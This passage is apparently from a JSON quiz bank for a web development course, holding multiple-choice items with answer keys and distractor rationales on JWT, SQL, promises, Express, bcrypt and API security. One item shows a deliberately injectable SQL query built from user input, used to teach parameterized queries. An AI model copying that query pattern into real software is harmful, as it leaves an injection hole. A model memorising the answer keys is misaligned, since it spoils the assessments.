12`) targets\nstudents who incorrectly start the loop at `i = 1` rather than `i = 0`, or who add 1 to each index.\n","bloom":"apply","source":"Slide 3, ISAQuiz3 Q12"},{"id":"jwt-q-01","type":"MCQ","topic":"JWT — structure and components","marks":2,"question":"A JWT produced by `jwt.sign({ username }, TOKEN_SECRET, { algorithm: 'HS256' })` has\nwhich three parts, in order?\n","choices":["Header, Payload, and Certificate","Header, Body, and Footer","Header, Payload, and Signature","Header, Body, and Digest"],"correct":2,"rationale":"A JWT is three Base64url-encoded strings joined by dots: header, payload, and signature.\nThe header declares the algorithm and token type. The payload carries claims such as username\nand expiry. The signature is the HMAC of the header and payload computed with the secret key —\nit proves the token was not tampered with. Option A is the primary distractor in ISAQuiz11 Q5:\n\"Certificate\" has no meaning in JWT; a certificate is an X.509 structure used in TLS, not a JWT\ncomponent. Option B replaces both correct terms: \"Body\" is not a JWT term (the correct term is\nPayload), and \"Footer\" does not exist in the specification. Option D combines the wrong \"Body\"\nterm with \"Digest,\" which is a raw hash output — not the same as a keyed HMAC signature.\n","bloom":"remember","source":"Slide 10, ISAQuiz11 Q5"},{"id":"jwt-q-02","type":"MCQ","topic":"JWT — signing mechanism and secret key","marks":2,"question":"A server signs a JWT using `jwt.sign({ username }, TOKEN_SECRET, { algorithm: 'HS256' })`.\nThe token is later returned by the client. How does the server verify the token has not\nbeen tampered with?\n","choices":["It decrypts the token with the secret key and checks the payload matches its session store","It recomputes the HS256 signature over the received header and payload using the secret key and compares it to the token's signature","It calls a third-party certificate authority to verify the token's certificate","It hashes the entire token with bcrypt and compares the result to a stored hash"],"correct":1,"rationale":"JWT verification is stateless: the server recomputes the HS256 signature by running HMAC-SHA256\nover the Base64url-encoded header and payload using the same secret key used at signing time.\nIf the recomputed signature matches the signature in the token, the token is authentic and\nunmodified. No database lookup or session store is required. Option A conflates JWT with\nsession-based authentication: JWT does not use a session store, and the token is not encrypted —\nit is signed. A common trap is to say the server \"decrypts\" the token; HS256 is HMAC, not\nencryption. Option C is a misconception about asymmetric JWT variants (RS256 uses a\ncertificate-authority-backed key pair), but even then the server verifies a signature using its\nown key, not an external certificate authority call. Option D confuses bcrypt (a slow\npassword-hashing function) with the keyed HMAC used for JWT signing; bcrypt is used for password\nstorage, not token verification.\n","bloom":"analyze","source":"Slide 10, ISAQuiz11 Q7"},{"id":"jwt-q-03","type":"MCQ","topic":"JWT — storage security and XSS exposure","marks":2,"question":"A developer stores a JWT in `localStorage` instead of an HttpOnly cookie.\nWhat attack does this enable that HttpOnly cookie storage prevents?\n","choices":["An attacker can intercept the JWT over the network because localStorage is not encrypted","An injected script can call `localStorage.getItem('token')` and exfiltrate the JWT","The JWT expires immediately because localStorage clears on tab close","Cross-site request forgery (CSRF) attacks, because the browser sends localStorage values automatically"],"correct":1,"rationale":"Storing a JWT in `localStorage` makes it readable by any JavaScript on the page, including\ninjected scripts from a Cross-Site Scripting (XSS) attack. An attacker who achieves XSS calls\n`localStorage.getItem('token')` and ships the value to their server. An HttpOnly cookie is\ninvisible to JavaScript — the browser holds it and sends it on requests, but the page script\nnever sees the value, so there is nothing to steal via XSS. Option A is wrong: localStorage\nstores data in the browser's memory and is not transmitted over the network by itself; the\nSecure flag on cookies (not storage location) addresses interception. Option C is wrong:\nlocalStorage persists across tabs and sessions until explicitly cleared; sessionStorage clears\non tab close, but JWT expiry is controlled by the `expiresIn` claim, not storage. Option D\ninverts the CSRF mechanism: the browser automatically sends cookies (which is why SameSite\nmatters), not localStorage values; localStorage does not participate in automatic credential\nsending, so CSRF is not its primary risk.\n","bloom":"apply","source":"Slide 10, Slide 11, ISAQuiz11 Q8"},{"id":"web-arch-patterns-q-01","type":"MCQ","topic":"Web Architectural Patterns","marks":2,"question":"A startup deploys its entire product — UI, business logic, and database access —\nas a single deployable unit. The team needs to add a coupon feature.\nWhat must happen before the new code reaches users?\n","choices":["Only the UI component is redeployed; business logic and data access layers continue running.","The entire application must be shut down, recompiled, and redeployed.","The coupon feature is deployed as a separate service without touching the running app.","The database access layer is updated independently while the rest of the app stays live."],"correct":1,"rationale":"Monolithic architecture packages all components into one deployable unit. Any change — even to a single feature — requires shutting down, rebuilding, and redeploying the entire application. Option A describes layered architecture behaviour where individual layers can theoretically be replaced, not a monolith where no such boundary exists. Option C describes MSA — the ability to deploy a single service without touching others is the defining advantage that motivated the migration away from monolithic design. Option D is a distractor targeting students who confuse layered architecture (where layers are logical boundaries) with truly independent deployability; in a monolith, the layers are logical, not process-level.\n","bloom":"understand","source":"Slide 2, Lesson 15"},{"id":"web-arch-patterns-q-02","type":"MCQ","topic":"Web Architectural Patterns","marks":2,"question":"In the API-centric architecture pattern, what is the role of the API gateway?\n","choices":["It stores data for all backend services so they share a common database.","It routes every client HTTP request to the appropriate backend service and returns JSON to the client.","It renders HTML pages on the server and sends them directly to the browser.","It handles only authentication; all other requests bypass it and reach services directly."],"correct":1,"rationale":"In API-centric MSA, the API gateway is the sole entry point for all client requests. The client never calls individual services directly; the gateway routes each request to the correct service, which returns JSON, and the gateway relays the response. Option A confuses the gateway with a shared database — MSA explicitly avoids shared data stores to preserve service independence. Option C describes server-side rendering (SSR), which is the opposite of the API-first / headless pattern; in API-centric design, the client handles all rendering. Option D describes an authentication proxy, a limited deployment pattern where only auth goes through a gateway; full API-centric design routes all traffic, not just auth.\n","bloom":"analyze","source":"Slide 2, Lesson 15"},{"id":"sql-crud-q-01","type":"MCQ","topic":"SQL CRUD: querying and modifying data","marks":2,"question":"Which SQL statement retrieves all columns and all rows from a table named `orders`?","choices":["`SELECT all FROM orders;`","`SELECT * FROM orders;`","`GET * FROM orders;`","`FETCH orders;`"],"correct":1,"rationale":"`SELECT * FROM orders` is valid SQL: `*` is the wildcard that returns every column, and `FROM orders` identifies the source table. Choice A is the trap directly tested in ISAQuiz10 Q7 — `all` is not a valid SQL keyword in a SELECT column list; the statement produces a syntax error. Choice C uses `GET`, which is not a SQL keyword; SQL uses SELECT for reads. Choice D uses `FETCH`, which is a cursor operation in some SQL dialects, not a standalone table query — it does not retrieve all rows from a named table without a preceding cursor declaration.\n","bloom":"remember","source":"Slide 7, Quiz 10 Q7","tags":["pretest"]},{"id":"sql-crud-q-02","type":"MCQ","topic":"SQL CRUD: querying and modifying data","marks":2,"question":"You want to retrieve all rows from an `employees` table where `department` equals `'HR'`. Which query is correct?\n","choices":["`SELECT * FROM employees WHERE department IS 'HR';`","`SELECT * FROM employees WHERE department = 'HR';`","`SELECT *.* FROM employees WHERE department = 'HR';`","`SELECT * FROM employees WHERE department != 'HR';`"],"correct":1,"rationale":"`WHERE department = 'HR'` uses the equality operator `=`, which is the correct SQL operator for matching a column value against a string literal. Choice A uses `IS`, which tests for NULL (`WHERE column IS NULL`) — using `IS` with a non-NULL string literal is not valid standard SQL for equality comparison; this misconception was a live wrong-answer option in ISAQuiz10 Q12. Choice C uses `*.*`, which is not valid SQL syntax — `SELECT *` retrieves all columns from all identified tables, but `*.*` is not a recognized column specifier in this context. Choice D uses `!=`, which returns all employees who are NOT in HR — the opposite of the intended query.\n","bloom":"apply","source":"Slide 7, Quiz 10 Q12"},{"id":"promise-chaining-q-01","type":"MCQ","topic":".then() Chaining, .catch(), and .finally()","marks":2,"question":"What is the output of the following code?\n\n```js\nsetTimeout(() =\u003e console.log('setTimeout1'), 0);\nPromise.resolve()\n  .then(() =\u003e console.log('then1'))\n  .then(() =\u003e console.log('then2'));\nsetTimeout(() =\u003e console.log('setTimeout2'), 0);\n```\n","choices":["`then1`, `then2`, `setTimeout1`, `setTimeout2`","`then1`, `setTimeout1`, `then2`, `setTimeout2`","`setTimeout1`, `then1`, `then2`, `setTimeout2`","`then1`, `setTimeout2`, `then2`, `setTimeout1`"],"correct":0,"rationale":"`.then()` callbacks are microtasks; `setTimeout` callbacks are macrotasks. The event loop drains the entire microtask queue before pulling any macrotask. `setTimeout1` is queued as a macrotask, then `then1` is queued as a microtask via `Promise.resolve().then(...)`, then `setTimeout2` is queued as a macrotask. The call stack empties. The microtask queue drains first: `then1` fires and immediately queues `then2` (the next `.then()` in the chain); `then2` fires. Only after the microtask queue is fully empty does the event loop pick up the first macrotask, printing `setTimeout1`, then `setTimeout2`. Distractor B targets the misconception that `setTimeout` callbacks can interleave with microtasks after each `.then()` fires — the macrotask queue does not get a turn between microtasks. Distractor C targets students who assume `setTimeout` fires first because it was registered before the `.then()` calls. Distractor D targets students who believe `setTimeout` callbacks are interleaved with `.then()` callbacks based on registration order rather than queue type.\n","bloom":"apply","source":"Slide 6, ISAQuiz9 Q3"},{"id":"promise-chaining-q-02","type":"MCQ","topic":".then() Chaining, .catch(), and .finally()","marks":2,"question":"What is the output of the following code?\n\n```js\nPromise.resolve(42)\n  .finally(() =\u003e {\n    console.log('cleanup');\n    return 99;\n  })\n  .then(val =\u003e {\n    console.log(val);\n  });\n```\n","choices":["`cleanup`, `42`","`cleanup`, `99`","`cleanup`, `undefined`","`42`, `cleanup`"],"correct":0,"rationale":"`.finally()` runs its callback regardless of the settled outcome but passes the original upstream value through to the next link in the chain — it does not receive an argument and its return value is ignored (unless it throws). The upstream Promise is fulfilled with `42`. `.finally()` fires, printing `cleanup`. The `return 99` inside `.finally()` is discarded. The Promise returned by `.finally()` is fulfilled with the original value `42`, so the `.then()` callback receives `42` and prints it. Distractor B targets the misconception that the return value of the `.finally()` callback replaces the upstream value — students who treat `.finally()` like `.then()` would expect `99`. Distractor C targets students who know `.finally()` receives no argument but incorrectly assume that the downstream `.then()` also receives `undefined` rather than the original fulfilled value. Distractor D targets students who assume `.finally()` runs after all downstream `.then()` handlers, reversing the order.\n","bloom":"understand","source":"Slide 6, ISAQuiz9 Q10"},{"id":"js-oop-q-01","type":"MCQ","topic":"OOP in JavaScript: Classes, Inheritance, and Composition","marks":2,"question":"What does `typeof []` return in JavaScript?\n","choices":["`\"array\"`","`\"object\"`","`\"undefined\"`","`\"number\"`"],"correct":1,"rationale":"Arrays are objects in JavaScript. The `typeof` operator reports the internal type tag, which for\nall non-function objects — including arrays and even `null` — is `\"object\"`. `typeof` cannot\ndistinguish a plain object from an array; use `Array.isArray(value)` for that. Distractor A\n(`\"array\"`) is the most common wrong answer on ISAQuiz4: students expect `typeof` to reflect\nthe array's literal construction. Distractor C (`\"undefined\"`) targets students who confuse\nan empty array with an uninitialized variable. Distractor D (`\"number\"`) targets students who\nthink the bracket notation `[]` implies something numeric.\n","bloom":"remember","source":"Slide 1, ISAQuiz4 Q5"},{"id":"js-oop-q-02","type":"MCQ","topic":"OOP in JavaScript: Classes, Inheritance, and Composition","marks":2,"question":"A subclass constructor calls `super(first, last)` before assigning `this.gpa = gpa`.\nWhat happens if you remove the `super(first, last)` call and access `this` immediately?\n\n```js\nclass Student extends Person {\n  constructor(first, last, gpa) {\n    // super(first, last) removed\n    this.gpa = gpa;\n  }\n}\n```\n","choices":["`this.gpa` is set to `undefined` because the parent constructor never ran","`ReferenceError: Must call super constructor in derived class before accessing 'this'`","The code runs normally; `extends` handles the parent initialization automatically","`TypeError: gpa is not a constructor`"],"correct":1,"rationale":"JavaScript enforces that `super()` must be called before any access to `this` in a derived class\nconstructor. `extends` sets up the prototype chain but does not automatically invoke the parent\nconstructor — `super()` does that. Omitting it and then touching `this` throws a `ReferenceError`\nat runtime. Distractor A targets students who think the missing parent call merely leaves fields\nunset rather than throwing. Distractor C targets the misconception that `extends` implicitly calls\nthe parent constructor. Distractor D targets students who confuse `gpa` (a plain value) with a\nconstructor function, misreading the `TypeError` message.\n","bloom":"analyze","source":"Slide 1, ISAQuiz4"},{"id":"nodejs-basics-q-01","type":"MCQ","topic":"Node.js Runtime","marks":2,"question":"Which statement best describes how Node.js handles 100 simultaneous file-read requests?\n","choices":["It creates one thread per request, so 100 requests require 100 threads waiting on the file system.","It delegates each file-read to the OS asynchronously, then processes callbacks as results arrive — all on one thread.","It blocks the single thread on each file-read in turn, processing requests one at a time.","It uses the Chrome V8 engine to spawn worker processes for each I/O operation."],"correct":1,"rationale":"Node.js runs single-threaded non-blocking: the single thread delegates file-read operations to the OS via libuv, registers a callback, and immediately picks up the next request — the thread never idles waiting for disk (Slide 4).\nCreating one thread per request is the traditional synchronous multi-threaded model (e.g., naive PHP/ASP.NET); it is what Node.js replaces, not what it does.\nBlocking the single thread sequentially would serialize all 100 requests — this is the single-threaded blocking model shown in the restaurant analogy as the waiter who stands at the kitchen window.\nV8 is the JavaScript engine that compiles JS to native machine code; it does not spawn worker processes for I/O. Worker threads are a separate opt-in feature, not the default model.\n","bloom":"understand","source":"Slide 4, ISAQuiz7.pdf","tags":["pretest"]},{"id":"api-security-best-practices-q-01","type":"MCQ","topic":"API security — SQL injection prevention","marks":2,"question":"An Express route builds a query this way:\n\n```js\nconst query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\ndatabase.query(query);\n```\n\nWhich change prevents SQL injection in this code?\n","choices":["Replace single quotes in `newEmail` using `.replace(/'/g, '')`","Wrap the template literal in `JSON.stringify()` before passing it to `database.query()`","Use a parameterized query: `database.query('UPDATE users SET email=? WHERE id=?', [newEmail, userId])`","Validate that `newEmail` matches an email regex before running the query"],"correct":2,"rationale":"Parameterized queries pass user input as bound data values through the database driver's\nprotocol layer. The driver treats the entire substituted value as a string literal — SQL syntax\ninside the value never executes. This separates SQL structure from data at the protocol level.\nOption A is the explicit wrong-answer pattern confirmed in ISAQuiz12 Q2: `.replace()` strips\nsingle quotes but is bypassable with hex encodings, multi-byte characters, and other vectors\nthat do not rely on the single-quote character. It is not a fix. Option B wraps the already-\nconstructed injection-vulnerable string in JSON encoding, which does not prevent the injected\nSQL from executing once the driver receives it. Option D applies input validation (an email\nregex) — useful as a secondary layer but not sufficient alone, because regex-valid email values\ncan still carry SQL payloads when interpolated into template literals.\n","bloom":"apply","source":"Slide 12, ISAQuiz12 Q2"},{"id":"api-security-best-practices-q-02","type":"MCQ","topic":"API security — broken object-level authorization (BOLA)","marks":2,"question":"A student successfully authenticates and then sends `PUT /api/users/99/edit-profile`\neven though their own user ID is 42. The server updates user 99's profile without\nreturning an error. Which OWASP API vulnerability does this illustrate?\n","choices":["Mass Assignment — the server auto-binds all request body fields to the model","Broken Object-Level Authorization (BOLA) — the server checks authentication but not ownership of object 99","Excessive Data Exposure — the server returns more fields than the client requested","Security Misconfiguration — the server has a hardcoded admin credential"],"correct":1,"rationale":"Broken Object-Level Authorization (BOLA) occurs when a server verifies that a user is\nauthenticated but fails to verify that the authenticated user owns the specific object\nbeing acted on. Here the server confirms the student is logged in, but never checks whether\nuser 42 has the right to modify user 99's profile. The fix is object-level access control\nthat verifies ownership at the resource level, not just at the user level. Option A describes\nMass Assignment, which is about injecting unexpected model properties (e.g., `isAdmin: true`)\nvia a raw request body — the vulnerability here is not about body field binding. Option C\ndescribes Excessive Data Exposure, which is a response-side problem about returning too much\ndata — not about who is allowed to trigger an operation. Option D describes Security\nMisconfiguration, which involves hardcoded secrets or default credentials — not about\nauthorization logic on object ownership.\n","bloom":"understand","source":"Slide 12, ISAQuiz12 Q7, ISAQuiz12 Q10"},{"id":"js-arrays-loops-q-01","type":"MCQ","topic":"Arrays, Loops, and Iteration Patterns","marks":2,"question":"What does the following code print to the console?\n\n```js\nlet arr = [];\narr[1] = 1234;\nconsole.log(arr[0]);\n```\n","choices":["`1234`","`undefined`","`Error: cannot assign index 1 to empty array`","`null`"],"correct":1,"rationale":"JavaScript arrays are sparse objects. Writing to index 1 without writing to index 0 leaves slot 0\nuninitialized. Reading an uninitialized slot returns `undefined` — no error is thrown. Distractor A\n(`1234`) targets students who assume a one-element array has only index 0 and expect both reads to\nreturn the same value. Distractor C (`Error`) directly mirrors a wrong-answer option from ISAQuiz2\nQ8 (\"Error - cannot assign index 1 to empty array\"), which students chose when they incorrectly\nbelieved sparse assignment was illegal. Distractor D (`null`) targets students who conflate\n\"unassigned\" with an explicit `null`.\n","bloom":"understand","tags":["pretest"],"source":"ISAQuiz2 Q8"},{"id":"json-localstorage-q-01","type":"MCQ","topic":"JSON and Web Storage","marks":2,"question":"A developer runs the following code and then closes and reopens the browser tab.\nWhat does `localStorage.getItem(\"user\")` return after the tab is reopened?\n\n```js\nconst profile = { name: \"Alice\", role: \"admin\" };\nlocalStorage.setItem(\"user\", JSON.stringify(profile));\n```\n","choices":["`null` — localStorage is cleared when the tab closes.","The string `'[object Object]'` — localStorage coerces objects automatically.","The JSON string `'{\"name\":\"Alice\",\"role\":\"admin\"}'`.","`undefined` — localStorage does not persist across page reloads."],"correct":2,"rationale":"localStorage persists until explicitly cleared — it survives tab closes, page reloads, and browser restarts. `JSON.stringify` serializes the object to a JSON string before `setItem` stores it, so `getItem` returns that exact string. Option A describes sessionStorage behaviour, not localStorage; the quiz explicitly tested this distinction (Quiz 5 Q5). Option B targets the misconception that `localStorage.setItem` coerces objects the way console.log does; coercion to `[object Object]` only happens if you pass the raw object without `JSON.stringify`. Option D reverses the persistence rule — `undefined` is returned for a key that was never set, not for a key set in a previous session.\n","bloom":"understand","source":"Slide 2, Quiz 5 Q5, ISAQuiz5.pdf Q5","tags":["pretest"]},{"id":"async-await-q-01","type":"MCQ","topic":"async/await: Cleaner Syntax Over Promises","marks":2,"question":"What does the following function return when invoked?\n\n```js\nasync function greet() {\n  return \"Hello\";\n}\n\nconst result = greet();\nconsole.log(typeof result);\n```\n","choices":["`object`","`string`","`undefined`","`function`"],"correct":0,"rationale":"An `async` function always returns a Promise, regardless of what the function body returns. The runtime wraps the bare return value `\"Hello\"` in `Promise.resolve(\"Hello\")` automatically. A Promise is an object, so `typeof result` evaluates to `\"object\"`. The `.then()` handler on the returned Promise would receive the string `\"Hello\"`, but `result` itself is a Promise object. Distractor B targets students who conflate the fulfilled value (`\"Hello\"`, a string) with the return type of the async function itself — the string is what the Promise resolves with, not what the function returns to the caller. Distractor C targets the misconception that async functions with no explicit `await` return nothing, or that the return value is lost because the function is asynchronous. Distractor D targets students who believe that because `async` transforms the function, calling it returns another function rather than executing it.\n","bloom":"understand","source":"Slide 9, ISAQuiz8 Q11"},{"id":"html-css-review-q-01","type":"MCQ","topic":"HTML DOM Structure, CSS Box Model, Selectors, and Attributes","marks":2,"question":"What is the correct order of the CSS box model layers, from **inside to outside**?\n","choices":["margin → padding → border → content","content → border → padding → margin","content → padding → border → margin","margin → border → padding → content"],"correct":2,"rationale":"The CSS box model places the content layer at the center, surrounded outward by padding (space\nbetween content and border), then border (the visible edge), then margin (transparent space\nseparating the element from its neighbors). Distractor A (`margin → padding → border → content`)\nis the exact wrong order tested in ISAQuiz1 Q1 — it reverses the model entirely, targeting\nstudents who memorize the layer names without knowing their direction. Distractor B\n(`content → border → padding → margin`) swaps padding and border, targeting students who\nconfuse which layer is closer to the content. Distractor D mirrors the ISAQuiz1 wrong option\nthat starts from the outside in but mis-orders the middle two layers.\n","bloom":"remember","tags":["pretest"],"source":"Slide 1, ISAQuiz1 Q1"},{"id":"restful-url-design-q-01","type":"MCQ","topic":"RESTful URL Design and API Versioning","marks":2,"question":"A team publishes `GET /getPatient/1` on day one.\nSix months later they want to add versioning. Which statement is true?\n","choices":["They can add `/v1/` to the path without breaking existing clients because the resource ID stays the same.","Adding `/v1/` retroactively is itself a breaking change — every existing client must update its endpoint string.","Versioning is only required when the HTTP method changes, not when the path structure changes.","The unversioned path `/getPatient/1` automatically redirects to `/v1/getPatient/1` once versioning is enabled."],"correct":1,"rationale":"API versioning must be designed in from the first public release. Clients that start calling `/getPatient/1` on day one have hard-coded that path. Renaming it to `/v1/patients/1` breaks every existing integration — that rename is itself a breaking change. Option A presents a common misconception: students assume the ID value is what clients depend on, not the URL structure; but REST clients bind to the full URL, not just the numeric segment. Option C conflates HTTP method changes (which are a separate kind of breaking change) with URL structural changes; both require a version bump for established clients. Option D invents automatic redirect behaviour — no framework creates redirects automatically when versioning is added; redirects must be explicitly configured, and even then existing clients pointing to the old path are broken until the redirect is live.\n","bloom":"analyze","source":"Slide 8, Slide 11, Lesson 17"},{"id":"public-private-keys-q-01","type":"MCQ","topic":"Asymmetric encryption — signing and verification key directions","marks":2,"question":"Amir signs a message using asymmetric encryption and sends it to Tom.\nTom wants to verify that the message came from Amir and was not altered.\nWhich key does Tom use?\n","choices":["Tom's private key","Tom's public key","Amir's private key","Amir's public key"],"correct":3,"rationale":"Verification uses the sender's public key. Amir signed the message with Amir's private key —\nonly Amir holds that key, so only Amir could have produced a valid signature. Tom uses Amir's\npublic key to verify the signature: if the check passes, the message came from Amir and was\nnot tampered with in transit. Tom's own keys play no role in this verification step. Option A\nis the most seductive wrong answer, confirmed by ISAQuiz11 Q9: students confuse \"verify\" with\n\"decrypt\" and reach for the receiver's private key. Decryption of a confidential inner envelope\nuses the receiver's private key — but verification of a signature is a separate operation with\nthe opposite key direction. Option B (Tom's public key) would be used only if Tom had signed\nsomething himself and needed external parties to verify it. Option C (Amir's private key) is\nthe key Amir used to sign — it is kept secret and never shared, so Tom cannot hold it.\n","bloom":"understand","source":"Slide 9, Slide 10, ISAQuiz11 Q9"},{"id":"js-async-event-loop-q-01","type":"MCQ","topic":"The Event Loop: How JavaScript Stays Non-Blocking","marks":2,"question":"What does the following code print to the console, in order?\n\n```js\nsetTimeout(function() {\n  console.log(1);\n}, 1);\n\nnew Promise(function(resolve) {\n  console.log(2);\n  resolve();\n}).then(function() {\n  console.log(4);\n});\n\nconsole.log(3);\n```\n","choices":["`2`, `3`, `4`, `1`","`1`, `2`, `3`, `4`","`2`, `3`, `1`, `4`","`2`, `4`, `3`, `1`"],"correct":0,"rationale":"The Promise executor runs eagerly and synchronously the moment `new Promise(executor)` is\nevaluated, so `console.log(2)` fires first. `resolve()` enqueues the `.then` callback to the\nmicrotask queue — it does not run immediately. `console.log(3)` runs next as synchronous code.\nWhen the call stack empties, the event loop drains the entire microtask queue before touching any\nmacrotask, so `console.log(4)` runs. Only then does the `setTimeout` macrotask fire, printing `1`.\nDistractor B (`1, 2, 3, 4`) targets students who assume `setTimeout` callbacks execute at their\nregistration point rather than in the macrotask queue. Distractor C (`2, 3, 1, 4`) targets\nstudents who know microtasks beat macrotasks but incorrectly place the `setTimeout` callback\nbefore the `.then` callback. Distractor D (`2, 4, 3, 1`) targets students who correctly identify\n`2` first but assume the `.then` callback fires immediately after `resolve()` rather than after\nall synchronous code.\n","bloom":"analyze","source":"Slide 4, ISAQuiz6 Q1, ISAQuiz6 Q14"},{"id":"modern-web-arch-q-01","type":"MCQ","topic":"Modern Web Architecture Trends","marks":2,"question":"A news organization runs a website, a mobile app, and a smart-TV interface —\nall displaying the same article content. The backend stores articles once and\ndelivers them via API; each frontend renders them independently.\nWhich architectural pattern describes this backend design?\n","choices":["Serverless architecture — the backend runs as stateless cloud functions invoked per request.","Headless architecture — the backend is decoupled from the frontend presentation layer.","Monolithic architecture — all three frontends share a single deployable unit.","Edge computing — content is processed close to the user rather than in a central data center."],"correct":1,"rationale":"Headless architecture decouples the backend (data and logic) from the frontend (presentation). The backend exposes content via API; any number of distinct frontends consume the same API and render content in whatever format suits their interface. This is the exact pattern described — one backend, three independent frontends. Option A (serverless) targets the misconception that headless and serverless are the same thing; serverless is an infrastructure decision about who manages servers, not a decision about frontend coupling. Option C (monolithic) targets students who confuse the fact that all three frontends share one backend with those frontends sharing a single deployable unit — they share an API, not a codebase. Option D (edge computing) is a distractor for students who associate distributed delivery (content reaching multiple devices) with edge processing; edge computing is about geographic proximity of compute nodes, not about frontend decoupling.\n","bloom":"apply","source":"Slide 8, Lesson 18"},{"id":"nodejs-modules-q-01","type":"MCQ","topic":"Node.js Modules","marks":2,"question":"Given the following code:\n\n```js\nconst url = require('url');\nconst address = 'http://localhost:8000/admin.html?user=123';\nconst parsed = url.parse(address, true);\n```\n\nWhich expression prints `/admin.html` — the path without the query string?\n","choices":["`console.log(parsed.pathname)`","`console.log(parsed.path)`","`console.log(parsed.search)`","`console.log(parsed.host)`"],"correct":0,"rationale":"`parsed.pathname` returns only the path segment of the URL — everything after the origin up to (but not including) the `?` character, giving `/admin.html` (ISAQuiz7 Q3, Slide 4).\n`parsed.path` includes the query string, returning `/admin.html?user=123`; using it as a filename means the server looks for a file whose name contains `?user=123`, which does not exist even when `admin.html` does — this is the documented exam trap (ISAQuiz7 Q3).\n`parsed.search` returns the raw query string portion including the `?`, giving `?user=123`.\n`parsed.host` returns the host and port (`localhost:8000`), not the path at all.\n","bloom":"understand","source":"Slide 4, ISAQuiz7.pdf Q3"},{"id":"password-hashing-q-01","type":"MCQ","topic":"bcrypt — cost factor and hashing semantics","marks":2,"question":"A registration handler calls `bcrypt.hash('123', 10)`. What does the `10` control,\nand why is a higher value more secure?\n","choices":["The length of the produced hash string — a longer hash is harder to crack","The number of salt characters prepended to the password before hashing","The cost factor, which sets the number of hashing iterations to 2^10; a higher value makes each hash computation slower, increasing the cost of brute-force attacks","The encryption key size in bits — 10 means 10-bit AES encryption"],"correct":2,"rationale":"The second argument to `bcrypt.hash()` is the cost factor (also called salt rounds). Setting\nit to 10 causes bcrypt to perform 2^10 = 1,024 internal hashing iterations before producing\nthe final hash. Raising the cost factor makes each individual hash computation slower. An\nattacker attempting millions of brute-force guesses per second pays the full computational\ncost for every attempt — higher cost factor = fewer guesses per second = slower attack.\nOption A is wrong: bcrypt always produces a fixed-length 60-character hash string regardless\nof the cost factor; length is not controlled by this argument. Option B conflates the cost\nfactor with salt management. bcrypt generates a random salt automatically and embeds it in the\nhash string; the second argument controls iteration count, not salt character length. Option D\nis wrong: bcrypt is a hashing function, not an encryption algorithm. There is no encryption\nkey and no bits-of-AES involved. The cost factor governs computational work, not key size.\n","bloom":"understand","source":"Slide 9, Slide 11"},{"id":"express-framework-q-01","type":"MCQ","topic":"Express Framework","marks":2,"question":"An Express server has this middleware registered before all route handlers:\n\n```js\napp.use((req, res, next) =\u003e {\n    res.setHeader('Access-Control-Allow-Origin', '*');\n    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n    // next() is intentionally omitted here\n});\n\napp.get('/api/v1/patients', (req, res) =\u003e {\n    res.json(patients);\n});\n```\n\nA client sends `GET /api/v1/patients`. What happens?\n","choices":["The request stalls permanently — the middleware never calls `next()`, so control never reaches the route handler.","Express skips the middleware because the route handler is registered first in source order.","The route handler executes normally — `next()` is only required in error-handling middleware.","The server throws a TypeError because `next` is not called within the timeout window."],"correct":0,"rationale":"Middleware in Express must call `next()` to pass control to the next middleware or route handler. A middleware that neither calls `next()` nor sends a response leaves the request permanently pending — the client waits indefinitely and the route handler never runs (Slide 8).\nExpress executes middleware in registration order, not source-order of the route handler; the `app.use()` call precedes `app.get()`, so the middleware always runs first.\n`next()` is required in all middleware that does not terminate the request — not only in error handlers. Omitting it in any pipeline function stalls the request.\nExpress does not impose a call timeout on `next()`; no TypeError is thrown. The request simply hangs with no response.\n","bloom":"apply","source":"Slide 8"},{"id":"oauth-ssl-q-01","type":"MCQ","topic":"OAuth 2.0 — bearer token and authorization model","marks":2,"question":"After a user clicks \"Login with Google\" and approves the consent screen,\nGoogle issues a bearer token to ClientApp. An attacker intercepts the token.\nWhat access does the attacker gain?\n","choices":["No access — the bearer token is bound to the original user's IP address","Read-only access — bearer tokens cannot be used to modify data","Full authorization for the scopes the token covers, because anyone who holds this token is implicitly granted authorization","Temporary read access for 60 seconds, because bearer tokens always expire in under a minute"],"correct":2,"rationale":"A bearer token grants authorization by possession alone: anyone who holds this token is\nimplicitly granted authorization. The server does not verify the holder's identity beyond\nchecking that the token is valid and unexpired. An attacker who intercepts the token has\nthe same access as ClientApp for every scope the token covers. This is why bearer tokens\nmust be transmitted exclusively over HTTPS and kept out of logs, URLs, and browser-accessible\nstorage. Option A is wrong: bearer tokens are not IP-bound; the bearer model specifically\nomits any proof-of-identity requirement beyond possession. Option B is wrong: the token's\nscope is set at the consent screen and can include write permissions; bearer does not imply\nread-only. Option D is wrong: bearer tokens issued by OAuth 2.0 providers such as Google\ntypically last much longer than 60 seconds (often hours or months); expiry duration is\nprovider-configured and scope-dependent.\n","bloom":"apply","source":"Slide 11"},{"id":"sql-promises-q-01","type":"MCQ","topic":"Async DB queries with promises: chaining successive SQL calls","marks":2,"question":"A Node.js route handler runs this code:\n\n```js\nconst promiseCon = con.promise();\n\npromiseCon\n  .query('SELECT * FROM patient WHERE patientid = ?', [id])\n  .then(([rows]) =\u003e {\n    if (rows.length === 0) throw new Error('Not found');\n    return promiseCon.query(\n      'UPDATE patient SET name = ? WHERE patientid = ?',\n      [newName, id]\n    );\n  })\n  .then(([result]) =\u003e res.json({ updated: result.affectedRows }))\n  .catch(err =\u003e res.status(500).json({ error: err.message }));\n```\n\nWhat does `con.promise()` return, and why is the UPDATE placed inside the first `.then()` rather than after the chain?\n","choices":["`con.promise()` returns a resolved Promise containing the connection; the UPDATE is placed inside `.then()` only for readability","`con.promise()` returns a promise-based wrapper around the connection whose `query()` calls return Promises; placing the UPDATE inside `.then()` guarantees it only runs after the SELECT result is available","`con.promise()` converts the connection to async/await syntax; the UPDATE must be inside `.then()` because `await` cannot be used with `query()`","`con.promise()` re-opens the database connection as a new socket; the UPDATE must follow the SELECT because two simultaneous connections would conflict"],"correct":1,"rationale":"`con.promise()` wraps the existing connection and returns an object whose `query()` method returns a Promise instead of accepting a callback. Placing the UPDATE query inside the first `.then()` handler enforces ordering: the handler only runs after the SELECT Promise settles, so `rows` is available to check existence before the UPDATE fires. Omitting this and firing the UPDATE outside the chain creates a race condition where both queries enter the MySQL queue simultaneously and the existence check is bypassed. Choice A targets the misconception that promise chaining is cosmetic — calling `.then()` is the mechanism that guarantees sequential execution, not a style choice. Choice C confuses `con.promise()` with `async/await` syntax — it returns a 